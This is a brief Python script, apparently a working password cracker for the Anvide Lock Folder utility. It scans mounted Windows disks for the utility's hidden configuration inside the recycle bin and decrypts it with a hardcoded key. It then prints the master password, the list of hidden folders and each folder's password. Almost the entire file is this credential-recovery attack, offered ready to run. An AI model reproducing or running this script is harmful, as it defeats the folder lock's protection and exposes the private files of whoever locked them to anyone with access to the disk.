# Anvide Lock Folder Cracker alpha version
# TODO: make file extractor

import os, sys

key = [195, 206, 200, 210, 212, 209, 204, 199, 197, 214]
alf = 'S-1-5-21-2059872123-2082230228-612134452-1080-5764-3451-a-l-f-872.'
dirsPasses = {}

def decrypt(filename):
    codeslist, result = open(filename, 'r').readlines(), ''
    for codes in codeslist:
        for i in range(len(codes.split('.'))):
            if codes.split('.')[i] != '\n':
                result += chr(int(codes.split('.')[i]) - key[i % 10])
            else:
                result += '\n'
    return result

for disk in os.listdir('/media/root'):
    diskFiles = os.listdir('/media/root/' + disk)
    try:
        pos = list(map(str.upper, diskFiles)).index('$RECYCLE.BIN')
        if alf in os.listdir('/media/root/%s/%s' % (disk, diskFiles[pos])):
            ALFFiles = os.listdir('/media/root/%s/%s/%s' % (disk, diskFiles[pos], alf))
            if 'alf.psw' in ALFFiles:
                programPass = decrypt('/media/root/%s/%s/%s/alf.psw' % (disk, diskFiles[pos], alf))
            if 'alf_dirs.lst' in ALFFiles:
                hiddenDirs  = decrypt('/media/root/%s/%s/%s/alf_dirs.lst' % (disk, diskFiles[pos], alf))
            for d, _, f in os.walk('/media/root/%s/%s/%s' % (disk, diskFiles[pos], alf)):
                if 'p~s~w~r~d~a~l~f.lfp' in f:
                    t = decrypt(os.path.join(d, 'p~s~w~r~d~a~l~f.lfp')).split('\n')
                    dirsPasses[t[0].split('\\')[-1]] = t[1]
    except: pass

print('Program password found: %s' % programPass)
print('Hidden directories found:\n%s' % hiddenDirs)
print('Directories passwords found:')
for k in sorted(dirsPasses.keys(), key = len):
    print(('{:<' + str(max(list(map(len, dirsPasses)))) + '}: {}').format(k, dirsPasses[k]))
